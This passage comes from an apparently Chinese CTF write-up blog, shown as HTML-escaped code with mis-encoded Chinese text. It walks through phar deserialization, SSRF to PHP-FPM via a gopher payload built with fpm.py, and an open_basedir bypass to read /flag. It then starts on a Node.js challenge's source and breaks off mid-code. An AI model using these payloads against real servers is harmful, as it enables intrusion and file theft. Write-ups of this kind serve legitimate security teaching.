&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™ä¸ªssrfè‚¯å®šå°±æ˜¯å¦ä¸€ä¸ªæ–‡ä»¶å¤¹é‡Œçš„ä¸œè¥¿äº†ï¼Œæ­£å¥½å¼€ç€fpmï¼Œé‚£å°±æ˜¯ssrfæ‰“9000ç«¯å£çš„fpmäº†ï¼Œphp.iniä¸­è¿˜é™åˆ¶äº†open_basedirï¼ŒåŽé¢è¿˜å¾—é¥¶ä¸€ä¸‹ï¼ˆè¿™æ˜¯å•¥å¥—å¨ƒé¢˜å•Šï¼ŒçœŸçš„å¥—&lt;/p>
&lt;p>å®³ï¼Œè¿˜å¾—åšã€‚å…ˆæ˜¯æž„é€ ç¬¬ä¸€ä¸ªpharï¼Œå°†urlè®¾ä¸º&lt;code>file:///etc/hosts&lt;/code>çœ‹å†…ç½‘åœ°å€&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Easytest&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$test&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;file:///etc/hosts&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Easytest&lt;/span>&lt;span style="color:#111">();&lt;/span> &lt;span style="color:#75715e">// æ³¨æ„pharä¸­çš„æ˜¯Main ä¹‹åŽå†ååºåˆ—åŒ–çš„æ˜¯Easytest
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$c&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#75715e">// O%3A8%3A%22Easytest%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00test%22%3Bs%3A1%3A%221%22%3B%7D
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Main&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$phar&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Phar&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exp.phar&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$phar&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">startBuffering&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$phar&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">setStub&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;GIF89a&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;?php __HALT_COMPILER(); ?&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$phar&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">setMetadata&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$phar&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">addFromString&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;test.txt&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;test&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$phar&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">stopBuffering&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ”¹åŽç¼€å’ŒMIMEä¸Šä¼ ï¼Œæ‹¿åˆ°è·¯å¾„./uploads/dce6e76f20.jpgï¼Œç„¶åŽåˆ°&lt;code>/catchmime.php?careful=&lt;/code>å¤„è§¦å‘ï¼Œcarefulå‚æ•°ä¼ å…¥&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119014623242.png" alt="image-20220119014623242">&lt;/p>
&lt;p>è¿™çœ‹äº†ä¸ªå¯‚å¯žï¼Œå¯„ï¼Œç›´æŽ¥çœ‹/proc/net/arpå§&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119015548163.png" alt="image-20220119015548163">&lt;/p>
&lt;p>å°´å°¬å°±å°´å°¬åœ¨è¿™ä¿©éƒ½ä¸æ˜¯æˆ‘ä»¬ç›´æŽ¥çš„ipï¼Œæƒ³æ‰¾çš„é¶æœºå°±åœ¨è¿™ä¸ªç½‘æ®µé‡Œï¼Œä½†æ˜¯æˆ‘éƒ½åŠ å‡5ä½äº†ï¼Œéƒ½æ²¡æ‰¾åˆ°æˆ‘ä»¬çš„ç›®æ ‡é¶æœºâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦åŠ å‡5ä½å·²ç»å¾ˆå¤šäº†â€¦â€¦&lt;/p>
&lt;p>å¯„ã€‚åŽé¢çš„æµç¨‹æˆ‘ç®€å•è¯´ä¸€ä¸‹å§ï¼Œæ‡’å¾—æœ¬åœ°æ­çŽ¯å¢ƒï¼Œå°±äº‘äº†ï¼Œå°±æ˜¯æ‘†ã€‚&lt;/p>
&lt;p>é¦–å…ˆç”¨pç‰›é‚£ä¸ªfpmçš„è„šæœ¬æž„é€ gopherçš„payload&lt;/p>
&lt;pre tabindex="0">&lt;code>python fpm.py ip '/var/www/html/index.php' -p 9000 -c &amp;quot;&amp;lt;?php phpinfo();?&amp;gt;&amp;quot;
&lt;/code>&lt;/pre>&lt;p>å°†ç”Ÿæˆçš„payloadå‰é¢åŠ ä¸Š&lt;code>gopher://ip:9000/_&lt;/code>ï¼Œæ”¾å…¥å‰é¢æž„é€ pharè„šæœ¬çš„urlå‚æ•°ä¸­ï¼Œä¸Šä¼ å¹¶è§¦å‘ï¼Œå›žæ˜¾æ­£å¸¸&lt;/p>
&lt;p>å› ä¸ºè¿˜æœ‰disable_functionså’Œopen_basedirçš„å­˜åœ¨ï¼Œæ‰€ä»¥å†ç»•ä¸€ä¸‹&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span> &lt;span style="color:#75af00">mkdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/tmp/fuck&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#75af00">chdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/tmp/fuck&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#75af00">ini_set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;open_basedir&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;..&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#75af00">chdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;..&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#75af00">chdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;..&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#75af00">chdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;..&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#75af00">chdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;..&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#75af00">chdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;..&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#75af00">ini_set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;open_basedir&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#75af00">print_r&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">scandir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">));&lt;/span>&lt;span style="color:#75af00">readfile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/flag&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">// è¿™é‡Œçš„éƒ¨åˆ†ä½œä¸ºfpm.pyçš„å‚æ•°ç”Ÿæˆæ–°çš„gopher payload
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å†ä¼ pharï¼Œå†è§¦å‘å°±èƒ½çœ‹flagäº†&lt;/p>
&lt;p>â€”â€”â€”â€”æ„Ÿæƒ³ï¼š19å¹´è¿™æ ·çš„å°±æ˜¯éš¾é¢˜äº†ï¼Œä½†æ˜¯æ”¾åˆ°2021ï¼Œä¸å¯¹ 2022å¹´ï¼Œè¿™æ ·çš„é¢˜å°±æ˜¯çº¯å¥—å¨ƒè€Œä¸éš¾äº†ï¼Œä¾§é¢åæ˜ ctfçœŸä»–å¦ˆçš„å¤ªå·äº†ï¼Œå¯„&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[2021ç¥¥äº‘æ¯]cralwer_z
&lt;/h4>
&lt;/summary>
&lt;p>å””ï¼Œæˆ‘ä»¥ä¸ºæˆ‘å½“æ—¶æ‰“äº†ï¼Œä½†æ˜¯å¥½åƒå¹¶æ²¡æœ‰ï¼ˆå°´å°¬&lt;/p>
&lt;p>æ³¨å†Œè´¦å·ç™»å…¥ï¼Œåªæœ‰ä¿®æ”¹profileä¸€ä¸ªé€‰é¡¹ï¼Œå¯ä»¥æ”¹username, affilication, age, Bucketï¼›çœ‹ä¸‹æºç &lt;/p>
&lt;p>index.jså¤„ç†/signup, /signin, /logoutï¼Œuser.jså¤„ç†/user/profileï¼Œé‡ç‚¹çœ‹ä¸‹è¿™è¾¹&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75af00">router&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/profile&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">next&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75af00">affiliation&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">age&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">bucket&lt;/span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">user&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">User&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">findByPk&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">userId&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">affiliation&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">age&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">bucket&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#00a8c8">typeof&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">age&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#d88200">&amp;#34;string&amp;#34;&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#00a8c8">typeof&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">bucket&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#d88200">&amp;#34;string&amp;#34;&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#00a8c8">typeof&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">affiliation&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#34;string&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;user&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75af00">user&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;Parameters error or blank.&amp;#34;&lt;/span> &lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">utils&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">checkBucket&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">bucket&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;user&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75af00">user&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;Invalid bucket url.&amp;#34;&lt;/span> &lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">authToken&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// æ›´æ–°å†…å®¹
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">User&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">update&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;span style="color:#75af00">affiliation&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">age&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">personalBucket&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">bucket&lt;/span>
&lt;span style="color:#111">},&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">where&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75af00">userId&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">userId&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">token&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">crypto&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">randomBytes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;hex&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">authToken&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">token&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">Token&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">create&lt;/span>&lt;span style="color:#111">({&lt;/span> &lt;span style="color:#75af00">userId&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">userId&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">token&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">valid&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span> &lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">Token&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">update&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;span style="color:#75af00">valid&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">},&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">where&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">userId&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">userId&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">token&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">Op&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">not&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">authToken&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">next&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">createError&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">500&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">/^https:\/\/[a-f0-9]{32}\.oss-cn-beijing\.ichunqiu\.com\/$/&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">bucket&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// å¯¹bucketè¿›è¡Œæ­£åˆ™åŒ¹é… ç¬¦åˆè¿™ä¸ªå½¢å¼
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">`/user/verify?token=&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">authToken&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// åŒ¹é…å¤±è´¥
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// Well, admin won&amp;#39;t do that actually XD.
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;user&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75af00">user&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">user&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">message&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;Admin will check if your bucket is qualified later.&amp;#34;&lt;/span> &lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">router&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/verify&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">next&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75af00">token&lt;/span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">token&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#00a8c8">typeof&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">token&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#d88200">&amp;#34;string&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Parameters error&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">user&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">User&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">findByPk&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">userId&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">Token&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">findOne&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;span style="color:#75af00">token&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">userId&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">userId&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">valid&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">Token&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">update&lt;/span>&lt;span style="color:#111">({&lt;/span>
